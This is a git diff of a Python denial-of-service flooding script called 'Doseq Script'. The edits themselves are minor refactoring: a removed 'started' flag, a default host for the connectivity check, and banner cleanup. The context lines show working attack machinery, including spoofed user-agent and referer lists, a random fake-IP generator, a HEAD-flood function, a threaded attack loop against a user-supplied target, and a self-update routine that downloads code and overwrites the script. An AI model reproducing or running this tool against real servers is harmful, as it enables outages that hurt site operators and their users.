@@ -3212,6 +3212,7 @@ headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) Apple
 headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
 headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
 
+
 headers_referers = list()
 headers_referers.append('http://www.google.com/?q=')
 headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
@@ -3346,7 +3347,7 @@ headers_referers.append("http://validator.w3.org/check?uri=")
 headers_referers.append("")
 
 os.system("cls || clear")
-started = False
+
 get_data = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\n\r\n'
 i = 1
 fake_ip = lambda: ".".join(str(random.randint(0, 255)) for _ in range(4))
@@ -3475,7 +3476,7 @@ def head_attack():
         if isKilled():break
 
 
-def cnet(server:str, port:int) -> bool:
+def cnet(server='www.google.com', port=80) -> bool:
    try:
       c = socket.create_connection((socket.gethostbyname(server), port), 2)
       c.close()
@@ -3487,23 +3488,17 @@ def cnet(server:str, port:int) -> bool:
 def quit(sig,fream):
     print(rd+"\n["+yl+"!"+rd+"]"+yl+" User requested shutdown. "+rd+"..."+wi)
     time.sleep(1)
-    if started:
-       print(rd+"  ["+yl+"~"+rd+"]"+yl+" Aborting Threads"+rd+"..."+wi)
-       kill()
-       time.sleep(2.5)
+    print(rd+"  ["+yl+"~"+rd+"]"+yl+" Aborting Threads"+rd+"..."+wi)
+    kill()
+    time.sleep(2.5)
     print(wi+"\n["+gr+"*"+wi+"] Thanks For Using Doseq Script :)")
-    if started:
-        print("["+gr+"*"+wi+"] I Hope You Used It With Permission"+yl+"!?"+wi)
+    print("["+gr+"*"+wi+"] I Hope You Used It With Permission"+yl+"!?"+wi)
     sys.exit(0)
 
 
 def update_doseq():
     if not cnet("raw.githubusercontent.com",80):
-        if cnet('www.google.com', 80):
-            internet = 1
-        else:
-           internet = 0
-        print(rd+"\n["+yl+"!"+rd+"]"+yl+f" Unable To Check For Updates {'Please Check Your Internet Connection' if not internet else ''} "+rd+"!!!"+wi)
+        print(rd+"\n["+yl+"!"+rd+"]"+yl+f" Unable To Check For Updates {'Please Check Your Internet Connection' if not cnet() else ''} "+rd+"!!!"+wi)
         sys.exit(1)
     print(wi+"["+gr+"I"+wi+"] Current Version: ["+yl+__version__+wi+"]")
     print(wi+"  ["+yl+"~"+wi+"]"+yl+" Check For Updates"+wi+"...")
@@ -3523,10 +3518,7 @@ def update_doseq():
         doseq_script.write(code)
     print(wi+"      ["+gr+"*"+wi+"]"+gr+" Updated"+wi+" Successfully :)")
 
-banner = """
-\033[1;31m
-
-
+banner = """\033[1;31m
                    .-"      "-. 
                   /            \ 
                  |  \033[1;33m $JOKER11\033[1;31m   | 
@@ -3541,7 +3533,6 @@ banner = """
 
             [---]   by:>\033[1;32m Oseid Aldary\033[1;37m   [---]\033[1;32m
             =-------=-=-=-=-=-=-=-=-=-------=
-
 """
 
 signal.signal(signal.SIGINT, quit)
@@ -3633,13 +3624,8 @@ print("["+gr+"+"+wi+"]"+wi+f" Setting Up Attack "+wi+" ["+gr+target+wi+":"+gr+st
 print(wi + "[" + yl + "~" + wi + f"] Check The Connection To The Target " + gr + f"{target}" + wi + ":" + rd + f"{port}" + wi + " [...]", end='\r')
 time.sleep(2)
 if not cnet(target,port):
-    if cnet('www.google.com',80):
-        internet = 1
-    else:
-        internet = 0
-
     print("["+rd+"-"+wi+"] Check The Connection To The Target "+gr+f"{target}"+wi+":"+rd+f"{port}"+wi+" ["+rd+"Fail"+wi+"]\n", end='\r')
-    print(rd+"  ["+yl+"!"+rd+"]"+yl+" Error: Unable to Connect to Target On "+rd+f"{target}"+yl+":"+rd+f"{port}"+yl+f" :: {'Please Check Your Internet Connection' if not internet else 'Please Check Your Target or port'}"+rd+" !!!\n"+wi)
+    print(rd+"  ["+yl+"!"+rd+"]"+yl+" Error: Unable to Connect to Target On "+rd+f"{target}"+yl+":"+rd+f"{port}"+yl+f" :: {'Please Check Your Internet Connection' if not cnet() else 'Please Check Your Target or port'}"+rd+" !!!\n"+wi)
     sys.exit(1)
 
 print("["+gr+"+"+wi+"]"+wi+f" Check The Connection To The Target "+gr+f"{target}"+wi+":"+rd+f"{port}"+wi+" ["+gr+"Connected"+wi+"]\n", end='\r')
@@ -3659,7 +3645,6 @@ print("["+yl+"I"+wi+"] Press "+gr+"' Ctrl+C ' "+wi+"To Stop The Attack")
 time.sleep(1.5)
 
 threads = ((threads // 2) if not (threads % 2) else (threads + 1) // 2) if attack in ['get','post'] else threads
-started = True
 
 for _ in range(threads):
     if attack == 'get':
